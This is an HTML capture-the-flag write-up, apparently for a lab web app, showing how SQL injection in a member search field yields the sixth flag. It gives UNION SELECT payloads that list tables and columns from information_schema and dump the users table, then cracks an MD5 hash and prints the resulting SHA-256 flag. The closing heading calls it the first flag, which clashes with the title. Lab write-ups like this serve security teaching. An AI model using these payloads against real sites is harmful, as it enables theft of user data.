<h1>On to the sixth flag</h1>


<h2>How to get flag</h2>

<ol>
<li>Navigate to http://192.168.1.100/index.php?page=member</li>
<li>Enter 1 or 1 = 1 inside search bar to test for basic sql injection</li>
<li>Try to get the name of the table using information_schema object</li>
    <p>Run the following script inside the search input field</p><br/>
    <p>
        ''
            1=1  UNION SELECT  table_name, 1 FROM information_schema.tables WHERE table_schema = database() 
        ''
        We should see the table returned is 'users'
    </p>
<li>Since we know the table name we can try to see what the contents are. First we need to know what the columns are though</li>
 <p>Run the following script inside the search input field</p><br/>
    <p>
        ''
            1=1  UNION SELECT  column_name, 1 FROM information_schema.columns WHERE table_schema = database()
        ''
    </p>
<li>So now we know the tables name and the columns in it so we can try to return the data inside the columns we got back now</li>
    <p>Run the following script inside the search input field</p><br/>
    <p>
        ''
            1=1 UNION SELECT null, concat (user_id,first_name,last_name,town,country ,planet,commentaire,countersign) from users
        ''
    </p>
<li>Inside your results you should see this inside one of the surname fields</li>
<p>Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28</p>
<li>So from the surname property we see to decode the password using MD5 then lowercasing the password </li>
<p>
    '''
    MD5 decrpyt result = FortyTwo
    lowercased = fortytwo
    '''
</p>
<li>After running sha 256 calculator on the lowercased result = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5</li>
</ol>


<h3>Well done we found the first flag!</h3>

